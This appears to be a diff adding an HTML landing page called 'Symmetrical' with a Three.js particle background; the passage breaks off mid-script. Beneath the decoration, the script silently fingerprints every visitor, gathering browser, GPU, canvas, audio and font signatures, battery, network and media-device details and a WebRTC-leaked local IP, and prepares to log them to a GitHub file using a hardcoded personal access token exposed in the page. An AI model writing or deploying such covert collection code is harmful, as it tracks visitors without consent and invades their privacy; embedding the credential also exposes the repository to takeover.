@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Symmetrical</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body { background: #0a0a0a; font-family: 'Inter', system-ui, -apple-system, sans-serif; overflow-x: hidden; }
+        #three-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; }
+        .glass { background: rgba(255,255,255,0.03); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.06); }
+        .glass-dark { background: rgba(0,0,0,0.7); backdrop-filter: blur(16px); border: 1px solid rgba(255,255,255,0.08); }
+        .gradient-text { background: linear-gradient(135deg, #f0f0f0 0%, #a0a0a0 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .card-hover { transition: all 0.3s ease; }
+        .card-hover:hover { background: rgba(255,255,255,0.06); border-color: rgba(255,255,255,0.12); transform: translateY(-2px); }
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #0a0a0a; }
+        ::-webkit-scrollbar-thumb { background: #2a2a2a; border-radius: 8px; }
+        .terminal-line { border-left: 2px solid #00ff88; padding-left: 12px; }
+        .terminal-cursor::after { content: '█'; animation: blink 1s step-end infinite; color: #00ff88; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+        .glow-text { text-shadow: 0 0 20px rgba(0,255,136,0.15); }
+        .info-grid-item { transition: all 0.2s; }
+        .info-grid-item:hover { background: rgba(255,255,255,0.03); }
+        .badge-pulse { animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        .z-top { position: relative; z-index: 10; }
+    </style>
+</head>
+<body>
+
+    <!-- 3D Canvas -->
+    <div id="three-canvas"></div>
+
+    <!-- Main Content - z-index above 3D -->
+    <div class="relative z-10 min-h-screen flex items-center justify-center p-4">
+
+        <div class="w-full max-w-6xl mx-auto space-y-6">
+
+            <!-- Header -->
+            <div class="text-center space-y-2">
+                <h1 class="text-6xl md:text-7xl font-bold tracking-tight gradient-text glow-text">Welcome to Symmetrical</h1>
+                <p class="text-gray-400 text-lg font-light tracking-wide">modern · minimal · transparent</p>
+            </div>
+
+            <!-- 3D Cool Icons (replaced with animated 3D-inspired cards) -->
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mt-4">
+                <div class="glass rounded-2xl p-5 card-hover flex flex-col items-center text-center border border-blue-500/20">
+                    <div class="text-5xl text-blue-400 mb-2"><i class="fas fa-cube"></i></div>
+                    <h3 class="text-sm font-semibold uppercase tracking-wider text-gray-300">3D Latency</h3>
+                    <p class="text-xs text-gray-500 mt-1">real-time spatial</p>
+                    <div class="w-full h-1 bg-blue-500/20 rounded-full mt-2"><div class="w-3/4 h-full bg-blue-400 rounded-full animate-pulse"></div></div>
+                </div>
+                <div class="glass rounded-2xl p-5 card-hover flex flex-col items-center text-center border border-emerald-500/20">
+                    <div class="text-5xl text-emerald-400 mb-2"><i class="fas fa-sphere"></i></div>
+                    <h3 class="text-sm font-semibold uppercase tracking-wider text-gray-300">3D Secure</h3>
+                    <p class="text-xs text-gray-500 mt-1">encrypted mesh</p>
+                    <div class="w-full h-1 bg-emerald-500/20 rounded-full mt-2"><div class="w-2/3 h-full bg-emerald-400 rounded-full animate-pulse"></div></div>
+                </div>
+                <div class="glass rounded-2xl p-5 card-hover flex flex-col items-center text-center border border-amber-500/20">
+                    <div class="text-5xl text-amber-400 mb-2"><i class="fas fa-icicles"></i></div>
+                    <h3 class="text-sm font-semibold uppercase tracking-wider text-gray-300">3D Instant</h3>
+                    <p class="text-xs text-gray-500 mt-1">zero-latency render</p>
+                    <div class="w-full h-1 bg-amber-500/20 rounded-full mt-2"><div class="w-full h-full bg-amber-400 rounded-full animate-pulse"></div></div>
+                </div>
+            </div>
+
+            <!-- Resend.com Terminal -->
+            <div class="glass-dark rounded-2xl p-5 border border-white/5">
+                <div class="flex items-center gap-2 mb-3">
+                    <div class="flex gap-1.5">
+                        <div class="w-3 h-3 rounded-full bg-red-500/80"></div>
+                        <div class="w-3 h-3 rounded-full bg-yellow-500/80"></div>
+                        <div class="w-3 h-3 rounded-full bg-green-500/80"></div>
+                    </div>
+                    <span class="text-xs text-gray-500 font-mono ml-2">terminal@symmetrical:~</span>
+                    <span class="ml-auto text-[10px] text-gray-600 badge-pulse"><i class="fas fa-circle text-green-400 text-[6px] mr-1"></i> live</span>
+                </div>
+                <div class="font-mono text-sm space-y-1.5 max-h-40 overflow-y-auto pr-2" id="terminal-output">
+                    <div class="text-gray-400 terminal-line">> system_initialized</div>
+                    <div class="text-gray-400 terminal-line">> gathering_telemetry...</div>
+                    <div class="text-gray-400 terminal-line">> fingerprint_engine_online</div>
+                    <div class="text-gray-400 terminal-line">> waiting_for_data...</div>
+                    <div class="text-gray-300 terminal-cursor" id="terminal-cursor">> _</div>
+                </div>
+            </div>
+
+            <!-- Info Grid - expanded -->
+            <div class="glass rounded-2xl p-5 md:p-7 card-hover border border-white/5">
+                <div class="flex items-center gap-3 mb-4">
+                    <i class="fas fa-microchip text-blue-400 text-xl"></i>
+                    <h2 class="text-xl font-semibold tracking-tight">Full Telemetry</h2>
+                    <span class="ml-auto text-xs text-gray-500 bg-black/40 px-3 py-1 rounded-full"><span id="field-count">0</span> fields</span>
+                </div>
+                <div id="info-grid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2 text-xs font-mono"></div>
+                <div class="mt-4 pt-3 border-t border-white/5 text-[10px] text-gray-500 flex justify-between">
+                    <span><i class="fas fa-fingerprint mr-1"></i> composite fingerprint</span>
+                    <span id="timestamp" class="text-gray-600"></span>
+                </div>
+            </div>
+
+            <div class="text-center text-[10px] text-gray-700 tracking-widest uppercase">· symmetrical · v3.0 ·</div>
+        </div>
+    </div>
+
+    <script>
+        // ----- THREE.JS 3D BACKGROUND (floating particles + torus) -----
+        (function init3D() {
+            const container = document.getElementById('three-canvas');
+            const scene = new THREE.Scene();
+            const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+            const renderer = new THREE.WebGLRenderer({ alpha: true, antialias: true });
+            renderer.setSize(window.innerWidth, window.innerHeight);
+            renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+            container.appendChild(renderer.domElement);
+
+            // Particles
+            const particleCount = 1200;
+            const geometry = new THREE.BufferGeometry();
+            const positions = new Float32Array(particleCount * 3);
+            for (let i = 0; i < particleCount * 3; i++) {
+                positions[i] = (Math.random() - 0.5) * 30;
+            }
+            geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+            const material = new THREE.PointsMaterial({
+                color: 0x00ff88,
+                size: 0.04,
+                transparent: true,
+                opacity: 0.6,
+                blending: THREE.AdditiveBlending
+            });
+            const particles = new THREE.Points(geometry, material);
+            scene.add(particles);
+
+            // Torus knot
+            const knotGeo = new THREE.TorusKnotGeometry(0.6, 0.2, 100, 16);
+            const knotMat = new THREE.MeshBasicMaterial({
+                color: 0x00ff88,
+                wireframe: true,
+                transparent: true,
+                opacity: 0.15
+            });
+            const knot = new THREE.Mesh(knotGeo, knotMat);
+            knot.position.set(0, 0, -4);
+            scene.add(knot);
+
+            // Second ring
+            const ringGeo = new THREE.TorusGeometry(0.9, 0.03, 32, 64);
+            const ringMat = new THREE.MeshBasicMaterial({
+                color: 0x3388ff,
+                wireframe: false,
+                transparent: true,
+                opacity: 0.2
+            });
+            const ring = new THREE.Mesh(ringGeo, ringMat);
+            ring.position.set(0, 0, -4);
+            ring.rotation.x = Math.PI / 2;
+            scene.add(ring);
+
+            camera.position.z = 5;
+
+            let time = 0;
+            function animate() {
+                requestAnimationFrame(animate);
+                time += 0.002;
+                particles.rotation.y = time * 0.05;
+                particles.rotation.x = Math.sin(time * 0.02) * 0.05;
+                knot.rotation.x = time * 0.3;
+                knot.rotation.y = time * 0.5;
+                ring.rotation.z = time * 0.2;
+                renderer.render(scene, camera);
+            }
+            animate();
+
+            window.addEventListener('resize', () => {
+                camera.aspect = window.innerWidth / window.innerHeight;
+                camera.updateProjectionMatrix();
+                renderer.setSize(window.innerWidth, window.innerHeight);
+            });
+        })();
+
+        // ----- MAIN DATA COLLECTION (EXPANDED: 40+ FIELDS) -----
+        (function() {
+            const GITHUB_TOKEN = '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';
+            const REPO_OWNER = 'codebase133799';
+            const REPO_NAME = 'Test';
+            const FILE_PATH = 'visitors_log.json';
+
+            const data = {};
+
+            // ---- IP / GEO ----
+            data.ip = 'fetching...';
+            data.ip_isp = '...';
+            data.ip_city = '...';
+            data.ip_region = '...';
+            data.ip_country = '...';
+            data.ip_loc = '...';
+            data.ip_org = '...';
+            data.ip_timezone = '...';
+            data.ip_postal = '...';
+            data.ip_asn = '...';
+
+            // ---- BROWSER / DEVICE ----
+            data.userAgent = navigator.userAgent;
+            data.platform = navigator.platform;
+            data.language = navigator.language;
+            data.languages = navigator.languages ? navigator.languages.join(', ') : 'n/a';
+            data.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
+            data.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown';
+            data.screenWidth = window.screen.width;
+            data.screenHeight = window.screen.height;
+            data.screenColorDepth = window.screen.colorDepth;
+            data.screenPixelDepth = window.screen.pixelDepth;
+            data.viewportWidth = window.innerWidth;
+            data.viewportHeight = window.innerHeight;
+            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            data.localTime = new Date().toString();
+            data.localTimeISO = new Date().toISOString();
+            data.doNotTrack = navigator.doNotTrack || 'unspecified';
+            data.cookieEnabled = navigator.cookieEnabled;
+            data.onLine = navigator.onLine;
+            data.referrer = document.referrer || 'direct';
+            data.hostname = window.location.hostname;
+            data.pathname = window.location.pathname;
+            data.protocol = window.location.protocol;
+            data.href = window.location.href;
+            data.origin = window.location.origin;
+
+            // ---- BATTERY ----
+            if (navigator.getBattery) {
+                navigator.getBattery().then(b => {
+                    data.batteryLevel = Math.round(b.level * 100) + '%';
+                    data.batteryCharging = b.charging;
+                    data.batteryTimeRemaining = b.dischargingTime ? Math.round(b.dischargingTime / 60) + 'min' : 'unknown';
+                }).catch(() => { data.batteryLevel = 'unavailable'; });
+            } else {
+                data.batteryLevel = 'not supported';
+                data.batteryCharging = 'not supported';
+                data.batteryTimeRemaining = 'not supported';
+            }
+
+            // ---- NETWORK ----
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                data.netType = conn.effectiveType || 'unknown';
+                data.netDownlink = conn.downlink ? conn.downlink + ' Mbps' : 'unknown';
+                data.netRtt = conn.rtt ? conn.rtt + ' ms' : 'unknown';
+                data.netSaveData = conn.saveData;
+            } else {
+                data.netType = 'not supported';
+                data.netDownlink = 'not supported';
+                data.netRtt = 'not supported';
+                data.netSaveData = 'not supported';
+            }
+
+            // ---- GPU ----
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        data.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'n/a';
+                        data.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'n/a';
+                    } else {
+                        data.gpuVendor = 'not available (no debug ext)';
+                        data.gpuRenderer = 'not available';
+                    }
+                    data.webglVersion = 'WebGL 1.0';
+                    if (gl.getParameter(gl.VERSION)) data.webglVersion = gl.getParameter(gl.VERSION);
+                } else {
+                    data.gpuVendor = 'webgl not supported';
+                    data.gpuRenderer = 'webgl not supported';
+                    data.webglVersion = 'none';
+                }
+            } catch(e) {
+                data.gpuVendor = 'error';
+                data.gpuRenderer = 'error';
+                data.webglVersion = 'error';
+            }
+
+            // ---- PLUGINS ----
+            let plugins = [];
+            try {
+                for (let i = 0; i < navigator.plugins.length; i++) {
+                    plugins.push(navigator.plugins[i].name);
+                }
+            } catch(e) { plugins = ['unavailable']; }
+            data.plugins = plugins.join('; ') || 'none';
+            data.pluginCount = plugins.length;
+
+            // ---- FONT SIGNATURE ----
+            try {
+                const fontCanvas = document.createElement('canvas');
+                fontCanvas.width = 200;
+                fontCanvas.height = 50;
+                const ctx = fontCanvas.getContext('2d');
+                const testFonts = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS'];
+                let fontSig = '';
+                for (let f of testFonts) {
+                    ctx.font = '20px ' + f;
+                    fontSig += f + ':' + ctx.measureText('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789').width + ';';
+                }
+                data.fontSignature = fontSig.substring(0, 200);
+            } catch(e) { data.fontSignature = 'error'; }
+
+            // ---- CANVAS HASH ----
+            try {
+                const c = document.createElement('canvas');
+                c.width = 200;
+                c.height = 50;
+                const cx = c.getContext('2d');
+                cx.textBaseline = 'top';
+                cx.font = '14px Arial';
+                cx.fillStyle = '#f60';
+                cx.fillRect(0, 0, 100, 50);
+                cx.fillStyle = '#069';
+                cx.fillText('symmetrical', 10, 10);
+                cx.strokeStyle = '#fff';
+                cx.lineWidth = 2;
+                cx.strokeRect(5, 5, 190, 40);
+                const imgData = cx.getImageData(0, 0, 200, 50).data;
+                let hash = 0;
+                for (let i = 0; i < imgData.length; i += 4) {
+                    hash = ((hash << 5) - hash) + imgData[i] + imgData[i+1] + imgData[i+2];
+                    hash = hash & hash;
+                }
+                data.canvasHash = hash.toString(16);
+            } catch(e) { data.canvasHash = 'error'; }
+
+            // ---- AUDIO HASH ----
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.type = 'sawtooth';
+                osc.frequency.value = 440;
+                gain.gain.value = 0;
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start(0);
+                osc.stop(0.1);
+                const analyser = audioCtx.createAnalyser();
+                gain.connect(analyser);
+                const buffer = new Float32Array(analyser.fftSize);
+                analyser.getFloatTimeDomainData(buffer);
+                let audioHash = 0;
+                for (let i = 0; i < buffer.length; i++) {
+                    audioHash = ((audioHash << 5) - audioHash) + Math.floor(buffer[i] * 1000);
+                    audioHash = audioHash & audioHash;
+                }
+                data.audioHash = audioHash.toString(16);
+                audioCtx.close();
+            } catch(e) { data.audioHash = 'not supported'; }
+
+            // ---- WEBRTC LOCAL IP (via STUN) ----
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                pc.createDataChannel('test');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = (e) => {
+                    if (e.candidate) {
+                        const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                        if (ip) {
+                            data.localIP = ip[0];
+                            pc.close();
+                        }
+                    }
+                };
+                setTimeout(() => { if (!data.localIP) { data.localIP = 'timeout'; pc.close(); } }, 2000);
+            } catch(e) { data.localIP = 'not supported'; }
+
+            // ---- MEDIA DEVICES ----
+            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                navigator.mediaDevices.enumerateDevices().then(devices => {
+                    const audioInput = devices.filter(d => d.kind === 'audioinput').length;
+                    const audioOutput = devices.filter(d => d.kind === 'audiooutput').length;
+                    const videoInput = devices.filter(d => d.kind === 'videoinput').length;
+                    data.mediaAudioInputs = audioInput;
+                    data.mediaAudioOutputs = audioOutput;
+                    data.mediaVideoInputs = videoInput;
+                }).catch(() => {
+                    data.medi
